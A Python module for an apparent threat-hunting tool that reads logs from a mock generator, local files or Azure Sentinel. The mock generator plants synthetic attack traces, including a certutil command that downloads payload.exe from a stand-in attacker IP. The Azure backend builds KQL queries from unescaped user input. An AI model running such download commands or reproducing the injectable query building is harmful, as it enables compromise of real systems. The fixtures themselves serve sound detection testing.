"""
Log source backends — swappable via LOG_BACKEND env var.

  mock  : synthetic log generator with planted IOCs (default, no SIEM needed)
  file  : reads JSON/JSONL files from LOCAL_LOG_DIR
  azure : live KQL query against Azure Monitor / Microsoft Sentinel

For the file backend, place files named after their table in LOCAL_LOG_DIR:
  ./logs/DeviceLogonEvents.jsonl
  ./logs/DeviceProcessEvents.jsonl
  etc.

Each line must be a JSON object whose keys match the table's field schema.
"""

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List

from . import keys


# ── Public entry point ───────────────────────────────────────────────────────

def query_logs(
    table_name: str,
    fields: List[str],
    lookback_hours: int,
    device_name: str,
    user_name: str,
    max_rows: int,
) -> List[Dict[str, Any]]:
    backend = keys.LOG_BACKEND
    if backend == "azure":
        return _query_azure(table_name, fields, lookback_hours, device_name, user_name, max_rows)
    if backend == "file":
        return _query_file(table_name, fields, max_rows)
    return _query_mock(table_name, fields, lookback_hours, device_name, user_name, max_rows)


# ── Mock backend (planted IOCs for demo / testing) ──────────────────────────

_ATTACKER_IP = "203.0.113.77"  # TEST-NET — safe to commit
_C2_PORT     = 8443

def _ts(hours_ago: float) -> str:
    t = datetime.now(timezone.utc) - timedelta(hours=hours_ago)
    return t.isoformat()

def _mock_logon_events(device: str, user: str, n: int) -> List[Dict]:
    rows = []
    # Plant: brute force then successful login
    for i in range(15):
        rows.append({
            "TimeGenerated":               _ts(random.uniform(0.5, 2)),
            "DeviceName":                  device or "WIN-DC-01",
            "AccountName":                 user or "svc_backup",
            "AccountDomain":               "CORP",
            "ActionType":                  "LogonFailed",
            "LogonType":                   3,
            "RemoteIP":                    _ATTACKER_IP,
            "RemoteIPType":                "Public",
            "InitiatingProcessFileName":   "lsass.exe",
            "InitiatingProcessAccountName":"SYSTEM",
        })
    rows.append({
        "TimeGenerated":               _ts(0.3),
        "DeviceName":                  device or "WIN-DC-01",
        "AccountName":                 user or "svc_backup",
        "AccountDomain":               "CORP",
        "ActionType":                  "LogonSuccess",
        "LogonType":                   3,
        "RemoteIP":                    _ATTACKER_IP,
        "RemoteIPType":                "Public",
        "InitiatingProcessFileName":   "lsass.exe",
        "InitiatingProcessAccountName":"SYSTEM",
    })
    # Noise
    for _ in range(min(n - len(rows), 30)):
        rows.append({
            "TimeGenerated":               _ts(random.uniform(0, 24)),
            "DeviceName":                  f"WORKSTATION-{random.randint(1,50):02d}",
            "AccountName":                 random.choice(["alice", "bob", "carol", "dave"]),
            "AccountDomain":               "CORP",
            "ActionType":                  "LogonSuccess",
            "LogonType":                   random.choice([2, 3]),
            "RemoteIP":                    f"10.0.{random.randint(0,5)}.{random.randint(1,254)}",
            "RemoteIPType":                "Private",
            "InitiatingProcessFileName":   "lsass.exe",
            "InitiatingProcessAccountName":"SYSTEM",
        })
    return rows[:n]


def _mock_process_events(device: str, user: str, n: int) -> List[Dict]:
    rows = []
    # Plant: Office → powershell -enc → certutil download chain
    rows.append({
        "TimeGenerated":               _ts(1.2),
        "DeviceName":                  device or "WORKSTATION-07",
        "AccountName":                 user or "alice",
        "FileName":                    "winword.exe",
        "FolderPath":                  "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "ProcessCommandLine":          "WINWORD.EXE /n malicious_invoice.docm",
        "InitiatingProcessFileName":   "explorer.exe",
        "InitiatingProcessCommandLine":"C:\\Windows\\Explorer.EXE",
        "SHA256":                      "aabbcc" + "0" * 58,
    })
    rows.append({
        "TimeGenerated":               _ts(1.19),
        "DeviceName":                  device or "WORKSTATION-07",
        "AccountName":                 user or "alice",
        "FileName":                    "powershell.exe",
        "FolderPath":                  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ProcessCommandLine":          "powershell.exe -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdA==",
        "InitiatingProcessFileName":   "winword.exe",
        "InitiatingProcessCommandLine":"WINWORD.EXE /n malicious_invoice.docm",
        "SHA256":                      "ddeeff" + "0" * 58,
    })
    rows.append({
        "TimeGenerated":               _ts(1.18),
        "DeviceName":                  device or "WORKSTATION-07",
        "AccountName":                 user or "alice",
        "FileName":                    "certutil.exe",
        "FolderPath":                  "C:\\Windows\\System32\\certutil.exe",
        "ProcessCommandLine":          f"certutil.exe -urlcache -split -f http://{_ATTACKER_IP}/payload.exe C:\\Users\\Public\\payload.exe",
        "InitiatingProcessFileName":   "powershell.exe",
        "InitiatingProcessCommandLine":"powershell.exe -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdA==",
        "SHA256":                      "112233" + "0" * 58,
    })
    for _ in range(min(n - len(rows), 30)):
        rows.append({
            "TimeGenerated":               _ts(random.uniform(0, 24)),
            "DeviceName":                  f"WORKSTATION-{random.randint(1,50):02d}",
            "AccountName":                 random.choice(["alice", "bob", "carol", "dave"]),
            "FileName":                    random.choice(["chrome.exe", "notepad.exe", "svchost.exe"]),
            "FolderPath":                  "C:\\Windows\\System32",
            "ProcessCommandLine":          "chrome.exe --no-sandbox",
            "InitiatingProcessFileName":   "explorer.exe",
            "InitiatingProcessCommandLine":"C:\\Windows\\Explorer.EXE",
            "SHA256":                      "aaaaaa" + "0" * 58,
        })
    return rows[:n]


def _mock_network_events(device: str, user: str, n: int) -> List[Dict]:
    rows = []
    # Plant: C2 beacon every ~60s for last 10 minutes
    for i in range(10):
        rows.append({
            "TimeGenerated":               _ts(i / 60),
            "DeviceName":                  device or "WORKSTATION-07",
            "ActionType":                  "ConnectionSuccess",
            "RemoteIP":                    _ATTACKER_IP,
            "RemotePort":                  _C2_PORT,
            "RemoteUrl":                   "",
            "LocalPort":                   random.randint(49152, 65535),
            "InitiatingProcessFileName":   "payload.exe",
            "InitiatingProcessCommandLine":"C:\\Users\\Public\\payload.exe",
        })
    for _ in range(min(n - len(rows), 30)):
        rows.append({
            "TimeGenerated":               _ts(random.uniform(0, 24)),
            "DeviceName":                  f"WORKSTATION-{random.randint(1,50):02d}",
            "ActionType":                  "ConnectionSuccess",
            "RemoteIP":                    f"142.250.{random.randint(0,255)}.{random.randint(1,254)}",
            "RemotePort":                  random.choice([80, 443]),
            "RemoteUrl":                   "www.google.com",
            "LocalPort":                   random.randint(49152, 65535),
            "InitiatingProcessFileName":   "chrome.exe",
            "InitiatingProcessCommandLine":"chrome.exe --no-sandbox",
        })
    return rows[:n]


def _mock_file_events(device: str, user: str, n: int) -> List[Dict]:
    rows = []
    # Plant: mass .locked renames (ransomware)
    for i in range(20):
        rows.append({
            "TimeGenerated":               _ts(0.1),
            "DeviceName":                  device or "FILE-SERVER-01",
            "ActionType":                  "FileRenamed",
            "FileName":                    f"document_{i:03d}.docx.locked",
            "FolderPath":                  "C:\\Shares\\Finance",
            "SHA256":                      "cccccc" + "0" * 58,
            "InitiatingProcessFileName":   "payload.exe",
            "InitiatingProcessAccountName": user or "alice",
        })
    for _ in range(min(n - len(rows), 30)):
        rows.append({
            "TimeGenerated":               _ts(random.uniform(1, 24)),
            "DeviceName":                  f"WORKSTATION-{random.randint(1,50):02d}",
            "ActionType":                  random.choice(["FileCreated", "FileModified"]),
            "FileName":                    f"report_{random.randint(1,100)}.xlsx",
            "FolderPath":                  "C:\\Users\\Public\\Documents",
            "SHA256":                      "dddddd" + "0" * 58,
            "InitiatingProcessFileName":   "excel.exe",
            "InitiatingProcessAccountName": random.choice(["alice", "bob"]),
        })
    return rows[:n]


def _mock_signin_logs(device: str, user: str, n: int) -> List[Dict]:
    rows = []
    # Plant: impossible travel US → Kazakhstan within 5 minutes
    rows.append({
        "TimeGenerated":          _ts(0.5),
        "UserPrincipalName":      user or "alice@corp.com",
        "AppDisplayName":         "Microsoft 365",
        "IPAddress":              "12.34.56.78",
        "Location":               "New York, US",
        "ResultType":             "0",
        "ResultDescription":      "Success",
        "ClientAppUsed":          "Browser",
        "ConditionalAccessStatus":"success",
    })
    rows.append({
        "TimeGenerated":          _ts(0.42),
        "UserPrincipalName":      user or "alice@corp.com",
        "AppDisplayName":         "Microsoft 365",
        "IPAddress":              "91.185.22.11",
        "Location":               "Almaty, KZ",
        "ResultType":             "0",
        "ResultDescription":      "Success",
        "ClientAppUsed":          "Browser",
        "ConditionalAccessStatus":"success",
    })
    for _ in range(min(n - len(rows), 30)):
        rows.append({
            "TimeGenerated":          _ts(random.uniform(0, 24)),
            "UserPrincipalName":      random.choice(["bob@corp.com", "carol@corp.com"]),
            "AppDisplayName":         "Microsoft 365",
            "IPAddress":              f"10.0.{random.randint(0,5)}.{random.randint(1,254)}",
            "Location":               "New York, US",
            "ResultType":             "0",
            "ResultDescription":      "Success",
            "ClientAppUsed":          "Browser",
            "ConditionalAccessStatus":"success",
        })
    return rows[:n]


def _mock_email_events(device: str, user: str, n: int) -> List[Dict]:
    rows = []
    # Plant: phishing from micros0ft-support.com failing SPF/DKIM/DMARC
    rows.append({
        "Timestamp":              _ts(2),
        "NetworkMessageId":       "aaaaaaaa-0000-0000-0000-000000000001",
        "SenderFromAddress":      "support@micros0ft-support.com",
        "RecipientEmailAddress":  user or "alice@corp.com",
        "Subject":                "URGENT: Your account password expires today",
        "DeliveryAction":         "Delivered",
        "EmailDirection":         "Inbound",
        "AuthenticationDetails":  "SPF:Fail;DKIM:Fail;DMARC:Fail",
        "ThreatTypes":            "Phish",
    })
    for _ in range(min(n - len(rows), 30)):
        rows.append({
            "Timestamp":              _ts(random.uniform(0, 24)),
            "NetworkMessageId":       f"bbbbbbbb-{random.randint(1000,9999)}-0000-0000-000000000000",
            "SenderFromAddress":      f"noreply@legit-vendor-{random.randint(1,10)}.com",
            "RecipientEmailAddress":  random.choice(["bob@corp.com", "carol@corp.com"]),
            "Subject":                random.choice(["Quarterly report", "Meeting invite", "FYI"]),
            "DeliveryAction":         "Delivered",
            "EmailDirection":         "Inbound",
            "AuthenticationDetails":  "SPF:Pass;DKIM:Pass;DMARC:Pass",
            "ThreatTypes":            "",
        })
    return rows[:n]


_MOCK_GENERATORS = {
    "DeviceLogonEvents":  _mock_logon_events,
    "DeviceProcessEvents":_mock_process_events,
    "DeviceNetworkEvents":_mock_network_events,
    "DeviceFileEvents":   _mock_file_events,
    "SigninLogs":         _mock_signin_logs,
    "EmailEvents":        _mock_email_events,
}


def _query_mock(
    table_name: str,
    fields: List[str],
    lookback_hours: int,
    device_name: str,
    user_name: str,
    max_rows: int,
) -> List[Dict[str, Any]]:
    generator = _MOCK_GENERATORS.get(table_name)
    if not generator:
        return []
    rows = generator(device_name, user_name, max_rows)
    # Project to requested fields only
    if fields:
        rows = [{k: v for k, v in row.items() if k in fields} for row in rows]
    return rows


# ── File backend ─────────────────────────────────────────────────────────────

def _query_file(
    table_name: str,
    fields: List[str],
    max_rows: int,
) -> List[Dict[str, Any]]:
    log_dir = Path(keys.LOCAL_LOG_DIR)
    for ext in (".jsonl", ".json", ".ndjson"):
        path = log_dir / f"{table_name}{ext}"
        if path.exists():
            rows: List[Dict[str, Any]] = []
            with path.open() as fh:
                for line in fh:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        rows.append(json.loads(line))
                    except json.JSONDecodeError:
                        continue
                    if len(rows) >= max_rows:
                        break
            if fields:
                rows = [{k: v for k, v in r.items() if k in fields} for r in rows]
            return rows
    return []


# ── Azure Monitor / Sentinel backend ────────────────────────────────────────

def _query_azure(
    table_name: str,
    fields: List[str],
    lookback_hours: int,
    device_name: str,
    user_name: str,
    max_rows: int,
) -> List[Dict[str, Any]]:
    try:
        from azure.identity import ClientSecretCredential          # type: ignore
        from azure.monitor.query import LogsQueryClient, LogsQueryStatus  # type: ignore
    except ImportError:
        raise RuntimeError(
            "Azure packages not installed. "
            "Run: pip install azure-identity azure-monitor-query"
        )

    credential = ClientSecretCredential(
        tenant_id=keys.AAD_TENANT_ID,
        client_id=keys.AAD_CLIENT_ID,
        client_secret=keys.AAD_CLIENT_SECRET,
    )
    client = LogsQueryClient(credential)

    project = f"| project {', '.join(fields)}" if fields else ""
    device_filter = f'| where DeviceName == "{device_name}"' if device_name else ""
    user_filter   = (
        f'| where AccountName == "{user_name}" or UserPrincipalName == "{user_name}"'
        if user_name else ""
    )
    kql = (
        f"{table_name}\n"
        f"| where TimeGenerated > ago({lookback_hours}h)\n"
        f"{device_filter}\n"
        f"{user_filter}\n"
        f"{project}\n"
        f"| limit {max_rows}"
    )

    response = client.query_workspace(
        workspace_id=keys.AZURE_WORKSPACE_ID,
        query=kql,
        timespan=timedelta(hours=lookback_hours),
    )

    if response.status != LogsQueryStatus.SUCCESS:
        raise RuntimeError(f"Azure query failed: {response.partial_error}")

    rows: List[Dict[str, Any]] = []
    for table in response.tables:
        cols = [c.name for c in table.columns]
        for row in table.rows:
            rows.append(dict(zip(cols, row)))
    return rows
